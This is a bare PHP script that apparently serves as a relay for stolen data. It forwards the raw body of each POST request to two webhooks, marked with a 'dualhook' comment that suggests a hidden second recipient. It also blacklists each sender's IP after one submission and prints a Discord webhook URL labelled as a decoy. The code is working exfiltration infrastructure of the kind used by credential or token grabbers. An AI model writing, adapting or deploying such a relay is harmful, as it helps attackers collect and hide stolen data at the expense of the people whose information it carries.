<?php

$webhook = "hook"; // hook1
$webhook2 = "hook"; // hook2


$target_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$target_ip_clam = "<" . $target_ip . ">";
$blacklist = "blackkkkis.lst";

$is_blacklisted = False;

if (strpos(file_get_contents($blacklist), $target_ip_clam) !== false)  {
    $is_blacklisted = True;
}

if ($is_blacklisted === false && $_SERVER['REQUEST_METHOD'] === 'POST') {

        $payload = file_get_contents('php://input');

        $ch = curl_init();  

        curl_setopt_array( $ch, [
            CURLOPT_URL => $webhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]); 

        $response = curl_exec( $ch );
        curl_close( $ch );  

        $fp = fopen($blacklist, 'a');
        fwrite($fp, $target_ip_clam);  
        fclose($fp);  

        /* dualhook */
        $ch = curl_init();  
        curl_setopt_array( $ch, [
            CURLOPT_URL => $webhook2,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]); 

        $response = curl_exec( $ch );
        curl_close( $ch );  
}

echo "https://discord.com/api/webhooks/8003690471785144415/41F_FFNoDo1jeGhE9TA94a5djjHOa_UCxj0Y1pAjdhdwBtyL5z-9UMkXigLp2TE5QVo3" // fake webhook

?>
